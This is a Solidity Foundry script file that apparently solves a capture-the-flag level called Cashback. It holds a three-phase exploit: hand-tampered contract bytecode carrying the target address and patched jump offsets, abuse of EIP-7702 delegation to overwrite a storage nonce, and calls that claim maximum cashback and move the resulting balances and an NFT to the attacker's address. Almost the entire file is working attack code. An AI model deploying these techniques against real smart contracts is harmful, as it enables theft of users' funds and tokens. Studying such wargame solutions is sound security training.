// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.30;

import "forge-std/Script.sol";
import "src/levels/Cashback/Cashback.sol";
import "src/levels/Cashback/CashbackFactory.sol";
import {IERC20} from "openzeppelin-contracts-v5.4.0/token/ERC20/IERC20.sol";
import {IERC721} from "openzeppelin-contracts-v5.4.0/token/ERC721/IERC721.sol";

CashbackFactory constant factory = CashbackFactory(0x0000000000000000000000000000000000000000); // Insert factory address
Cashback constant target = Cashback(payable(0x0000000000000000000000000000000000000000)); // Insert target address

contract CashbackAttackPhase1Script is Script {

    function setUp() public {}

    function run() public {

        vm.startBroadcast();

        // Creation bytecode prefix with code size modified
        // 61 04 F4 // Push 0x04F4 (runtime code size)
        // 80 // DUP1
        // 60 0B // Push 0x0B (runtime code offset)
        // 5f // Push 0
        // 39 // CODECOPY Copy to memory at 0x00 the code starting at 0x0B of size 0x04F4
        // 5f // PUSH0
        // f3 // RETURN
        // fe // INVALID
        bytes memory creationCodePrefix = hex"6104F480600B5F395FF3FE";

        // CashbackAttack Bytecode with jump opcodes modified to jump to the correct offsets generated with Cashback.py script
        bytes memory runtimeCodeJumpOffset =
            hex"608060405234801561002c575f5ffd5b5060043610610067575f3560e01c806334b151181461006b57806349f426501461008657806366a79de0146100b95780638380edb7146100ce575b5f5ffd5b6100736100dd565b6040519081526020015b60405180910390f35b6100a173eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee81565b6040516001600160a01b03909116815260200161007d565b6100cc6100c736600461035d565b6100ff565b005b6040516001815260200161007d565b5f805460ff166100fa57505f805460ff1916600117905561271090565b505f90565b60405163ebc3961360e01b815273eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee6004820152680ad78ebc5ac6200000602482015283906001600160a01b0386169063ebc39613906044015f604051808303815f87803b158015610162575f5ffd5b505af1158015610174573d5f5f3e3d5ffd5b505060405163ebc3961360e01b81526001600160a01b03848116600483015269054b40b1f852bda0000060248301528816925063ebc3961391506044015f604051808303815f87803b1580156101c8575f5ffd5b505af11580156101da573d5f5f3e3d5ffd5b5050604051637921219560e11b81526001600160a01b038816925063f242432a915061022c903090869073eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee90670de0b6b3a7640000906004016103b6565b5f604051808303815f87803b158015610243575f5ffd5b505af1158015610255573d5f5f3e3d5ffd5b50505050846001600160a01b031663f242432a3084610283856001600160a01b03166001600160a01b031690565b681b1ae4d6e2ef5000006040518563ffffffff1660e01b81526004016102ac94939291906103b6565b5f604051808303815f87803b1580156102c3575f5ffd5b505af11580156102d5573d5f5f3e3d5ffd5b50506040516323b872dd60e01b815230600482018190526001600160a01b0386811660248401526044830191909152861692506323b872dd91506064015f604051808303815f87803b158015610329575f5ffd5b505af115801561033b573d5f5f3e3d5ffd5b505050505050505050565b6001600160a01b038116811461035a575f5ffd5b50565b5f5f5f5f60808587031215610370575f5ffd5b843561037b81610346565b9350602085013561038b81610346565b9250604085013561039b81610346565b915060608501356103ab81610346565b939692955090935050565b6001600160a01b0394851681529290931660208301526040820152606081019190915260a0608082018190525f9082015260c0019056fea264697066735822122012a40b413b9ed6d34160483017030f3a324325cfa5baa910c0e407dce89fb8e464736f6c634300081e0033";

        // Tampered runtime bytecode
        // 60 <offset> Push (the offset will depend on the instance address as some bytes can be intepreted as EVM opcodes)
        // 56 JUMP to <offset>
        // instance Address
        // 5B JUMPDEST
        // type(CashbackAttack).runtimeCode with offset applied to jump instructions
        bytes memory runtimeCodeTampered =
            bytes.concat(hex"601c56", abi.encodePacked(target), hex"0000000000", hex"5B", runtimeCodeJumpOffset);

        // Deploy the tampered attack contract using a factory
        CashbackAttackBytecodeDeployer deployer = new CashbackAttackBytecodeDeployer();
        CashbackAttack attackContract =
            CashbackAttack(deployer.deployFromBytecode(bytes.concat(creationCodePrefix, runtimeCodeTampered)));

        // Execute attack pahse 1
        attackContract.attack(target, factory.FREE(), SuperCashbackNFT(target.superCashbackNFT()), msg.sender);
            
        vm.stopBroadcast();
    }
}

// Useful cast comands related to EIP7702
// Sign delegation:
// cast wallet sign-auth --account <wallet_account> <delegatee>
// Reset delegation:
// cast send --auth $(cast az) --account <wallet_account> --rpc-url <rpc_url> <self_address> "0x" "0x"
// Check account code:
// cast code <address> --rpc-url <rpc_url>

contract CashbackAttackPhase2Script is Script {

    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        CashbackAttackNonceSetter nonceSetter = new CashbackAttackNonceSetter();
        vm.signAndAttachDelegation(address(nonceSetter), vm.envUint("PRIVATE_KEY"));
        CashbackAttackNonceSetter(payable(address(msg.sender))).setNonce(9999);
        vm.stopBroadcast();
    }
}

contract CashbackAttackPhase3Script is Script {

    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        vm.signAndAttachDelegation(address(target), vm.envUint("PRIVATE_KEY"));
        Cashback(payable(address(msg.sender))).payWithCashback(
            Currency.wrap(address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE)), address(0), 1
        );
        vm.stopBroadcast();
    }
}





contract CashbackAttack {
    uint256 internal constant SUPERCASHBACK_NONCE = 10000;
    uint256 internal constant NATIVE_AMOUNT = 200000000000000000000;
    uint256 internal constant FREEDOM_COIN_AMOUNT = 25000000000000000000000;
    uint256 constant NATIVE_MAX_CASHBACK = 1 ether;
    uint256 constant FREE_MAX_CASHBACK = 500 ether;

    Currency public constant NATIVE_CURRENCY = Currency.wrap(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

    bool nonceOnce;

    function attack(Cashback cashbackContract, IERC20 freedomCoin, IERC721 superCashbackNFT, address recovery)
        external
    {
        Currency freedomCoinCurrency = Currency.wrap(address(freedomCoin));

        // Get max cashback on both currencies
        cashbackContract.accrueCashback(NATIVE_CURRENCY, NATIVE_AMOUNT);
        cashbackContract.accrueCashback(freedomCoinCurrency, FREEDOM_COIN_AMOUNT);

        // Transfer balances to the recovery address
        cashbackContract.safeTransferFrom(address(this), recovery, NATIVE_CURRENCY.toId(), NATIVE_MAX_CASHBACK, "");
        cashbackContract.safeTransferFrom(address(this), recovery, freedomCoinCurrency.toId(), FREE_MAX_CASHBACK, "");

        // Transfer Super Cashback NFT to the recovery address
        superCashbackNFT.transferFrom(address(this), recovery, uint256(uint160(address(this))));
    }

    function isUnlocked() public pure returns (bool) {
        return true;
    }

    function consumeNonce() external returns (uint256) {
        if (!nonceOnce) {
            nonceOnce = true;
            return SUPERCASHBACK_NONCE;
        }
        return 0;
    }
}

contract CashbackAttackNonceSetter layout at 0x442a95e7a6e84627e9cbb594ad6d8331d52abc7e6b6ca88ab292e4649ce5ba03 {
    uint256 public nonce;

    function setNonce(uint256 newNonce) external {
        nonce = newNonce;
    }
}

contract CashbackAttackBytecodeDeployer {
    function deployFromBytecode(bytes memory bytecode) public returns (address) {
        address child;
        assembly {
            child := create(0, add(bytecode, 0x20), mload(bytecode))
        }
        return child;
    }
}